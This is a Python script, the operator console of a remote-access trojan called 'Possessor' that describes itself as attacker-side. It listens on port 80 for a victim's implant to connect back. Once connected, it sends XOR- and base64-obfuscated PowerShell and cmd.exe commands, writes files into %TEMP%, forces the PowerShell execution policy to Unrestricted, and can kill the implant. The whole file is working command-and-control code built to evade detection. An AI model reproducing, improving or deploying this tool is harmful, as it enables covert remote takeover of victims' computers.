#!/usr/bin/python3
# -*- coding: utf-8 -*-

'''
	Possessor - Attacker Side
	by gnx
	twitter.com/alissonbertochi
	
	https://github.com/gnxbr/Fully-Undetectable-Techniques/tree/main/possessor
	
'''

import base64
from socket import *
from os import system

PORT = 80
HOST = "0.0.0.0"
BUF = 4096
BYTE = 0x55
OPTIONS = {1: 'powershell', 2: 'cmd', 3: 'writefile'}

def connected(ip):
	print("\nConnection received from %s, let's play!\n" % ip)

def help():
	print("\nSome examples of use:\n")
	print("\tPowerShell: 'Get-ExecutionPolicy'")
	print("\t\tType [enable-scripting] to change this Policy to Unrestricted\n")
	print("\tcmd.exe: 'ipconfig'")
	print("\t\tWhen you use 'copy' or 'move', the cmd.exe is configured")
	print("\t\tby default to overwrite the target file without asking for")
	print("\t\tconfirmation. If you wanna change this, send 'set \"COPYCMD=\"'.")
	print("\t\tIn this case, after send some copy/move command, you will need")
	print("\t\tto send the confirmation message (in the target system's language)\n")
	print("\tWrite a File: [filename.ext content here]")
	print("\t\tThis file will be saved on %TEMP%)\n")
	print("\t[quit!] to close this client (the victim's side will keep running)\n");
	print("\t[kill!] or <CTRL+C> to kill the victim's side\n")
	print("\tP.S.: some commands can take more than 1 second")
	print("\tto generate its output, so you will need to")
	print("\twait for a while and type [readout!] to get the response\n")

def menu():
	opt = 0
	print("\nChoose an option:")
	print("\t[1] to PowerShell")
	print("\t[2] to cmd.exe")
	print("\t[3] to Write a File")
	print("\tType [change] to back to this menu when you want\n")
	while opt not in ["1", "2", "3"]:
		opt = input("Option: ")
	return int(opt)

def x0r(char):
	return chr(ord(char) ^ BYTE)

def unx0r(char):
	return chr(char ^ BYTE)

def prepare(cmd, target):

	if(target == 3):
		if(len(cmd.split()) < 2):
			return False
		cmd = "writefile: " + cmd.split()[0] + " " + "@".join(cmd.split()[1:]) + "\0"
		cmd = "".join(map(x0r, cmd))
		return base64.b64encode(cmd.encode('utf-8'))+b"\0"

	if("quit!" in cmd):
		exit()

	if("kill!" in cmd):
		print("Killing...")
		cmd = base64.b64encode("".join(map(x0r, "kill!\0")).encode('utf-8'))+b"\0"
		return cmd

	if("readout!" in cmd):
		print("Reading...")
		cmd = base64.b64encode("".join(map(x0r, "readout!\0")).encode('utf-8'))+b"\0"
		return cmd
	
	cmd = cmd.replace(" ", "@")

	if(target == 1):
		cmd = "powershell: " + cmd
			
	if(target == 2):
		cmd = "cmd: " + cmd

	cmd = cmd + "\0"
	cmd = "".join(map(x0r, cmd))
	cmd = base64.b64encode(cmd.encode('utf-8'))+b"\0"

	if(len(cmd) > BUF):
		print("cmd length > ", BUF)
		return False

	return cmd

if __name__=='__main__':

	ADDR = (HOST, PORT)
	serversock = socket(AF_INET, SOCK_STREAM)
	serversock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
	serversock.bind(ADDR)
	serversock.listen(1)
	
	system('clear')
	
	print("\n-----------------")
	print("Possessor - Attacker Side")
	print("-----------------\n")
	
	help()
	
	print("\nWaiting the victim to impersonate...")
	
	clientsock, addr = serversock.accept()
	
	connected(addr[0])
	opt = menu()
	
	while True:
		cmd = input(OPTIONS.get(opt) + " ::: ")
		
		if(cmd == "clear"):
			system('clear')
			continue

		if(cmd == "change"):
			system('clear')
			opt = menu()
			continue
			
		if(cmd == "help"):
			system('clear')
			help()
			continue
		
		if(cmd == ''):
			continue
			
		if(cmd == "enable-scripting") and (OPTIONS.get(opt) == "powershell"):
			cmd = "Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted -Force"
		
		cmd = prepare(cmd, opt)

		if not cmd: continue
		
		clientsock.send(cmd)
		result = clientsock.recv(BUF)
		while("EOF!" not in "".join(map(unx0r, base64.b64decode(result)))):
			received = "".join(map(unx0r, base64.b64decode(result)))
			if(received == "killed!"):
				clientsock.close()
				exit()
			print(received)
			result = clientsock.recv(BUF)


